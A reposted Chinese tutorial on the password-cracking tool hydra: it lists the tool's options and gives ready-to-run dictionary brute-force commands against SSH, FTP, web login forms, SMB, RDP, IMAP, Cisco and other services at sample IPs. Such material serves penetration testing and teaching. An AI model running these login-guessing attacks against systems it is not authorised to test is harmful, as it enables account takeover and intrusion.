# hydra简单使用

#### **[本文转载于CSDN]([hydra的使用教程 - 简书 (jianshu.com)](https://www.jianshu.com/p/abe573b057fb))**



**先列出hydra的参数：**

-s PORT 可通过这个参数指定非默认端口。

-l LOGIN 指定破解的用户，对特定用户破解。

-L FILE 指定用户名字典。

-p PASS 小写，指定密码破解，少用，一般是采用密码字典。

-P FILE 大写，指定密码字典。

-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。

-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。

-M FILE 指定目标列表文件一行一条。

-o FILE 指定结果输出文件。

-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。

-t TASKS 同时运行的线程数，默认为16。

-w TIME 设置最大超时的时间，单位秒，默认是30s。

-v / -V 显示详细过程。

server 目标ip



service 指定服务名，支持的服务和协议：

```
telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等
```

。



OPT 可选项

**使用教程如下：**

1.手动创建用户名字典和密码字典，这里只是为了演示，只加了几个用户名和弱口令。真正破解时，需要利用密码字典生成器生成强大的字典。

![img](https://upload-images.jianshu.io/upload_images/18666744-c90684b479fc6354.png?imageMogr2/auto-orient/strip|imageView2/2/w/715/format/webp)

2.破解ssh：

\# hydra -L username.txt -P password.txt -t 1 -vV -ens 192.168.60.117 ssh

其中192.168.60.117是想要破解的电脑IP

![img](https://upload-images.jianshu.io/upload_images/18666744-cea628b826677ae2.png?imageMogr2/auto-orient/strip|imageView2/2/w/866/format/webp)

破解成功，直接显示结果。

![img](https://upload-images.jianshu.io/upload_images/18666744-c1fdb82a98ff373c.png?imageMogr2/auto-orient/strip|imageView2/2/w/912/format/webp)

其它实例：

1.破解ssh：

\# hydra -l 用户名 -p 密码字典 -t 线程-vV -e ns ip ssh

\# hydra -l 用户名 -p 密码字典 -t 线程-o save.log -vV ip ssh

2.

破解ftp：

\# hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV

\# hydra ip ftp -l 用户名 -P 密码字典-e ns -vV

3.get

方式提交，破解web登录：

\# hydra -l 用户名 -p 密码字典 -t 线程-vV -e ns ip http-get /admin/

\# hydra -l 用户名 -p 密码字典 -t 线程-vV -e ns -f ip http-get /admin/index.php

4.post

方式提交，破解web登录：

\# hydra -l 用户名 -P 密码字典-s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"

\# hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:wrong username or password"

（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）

5.

破解https：

\# hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https

6.

破解teamspeak：

\# hydra -l 用户名 -P 密码字典 -s 端口号-vV ip teamspeak

7.

破解cisco：

\# hydra -P pass.txt 10.36.16.18 cisco

\# hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable

8.

破解smb：

\# hydra -l administrator -P top100.txt 192.168.0.102 smb

9.

破解pop3：

\# hydra -l muts -P pass.txt my.pop3.mail pop3

10.

破解rdp：

\# hydra 192.168.0.102 rdp -l administrator -P top100.txt -V

11.

破解http-proxy：

\# hydra -l admin -P pass.txt http-proxy://10.36.16.18

12.

破解imap：

\# hydra -L user.txt -p secret 10.36.16.18 imap PLAIN

\# hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN

此工具强大之处远多于以上测试，其密码能否破解关键在于强大的字典，对于社工型渗透来说，有时能够得到事半功倍的效果.

